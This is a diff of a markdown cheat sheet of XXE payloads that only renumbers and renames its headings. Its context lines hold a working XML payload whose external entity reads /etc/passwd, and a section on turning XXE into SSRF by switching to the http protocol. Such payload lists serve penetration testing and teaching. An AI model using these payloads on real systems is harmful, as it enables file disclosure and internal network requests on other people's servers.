@@ -1,5 +1,5 @@
-## XXE Payloads
-### Inband XXE with general entity (external Entity)
+# XXE Payloads
+## 1. File Retrieval via XXE
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
@@ -9,7 +9,7 @@
 </product>
 </stockchange>
 ```
-### SSRF via XXE
+## 2. SSRF via XXE
 Just use http protocol instead of file protocol to have SSRF.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
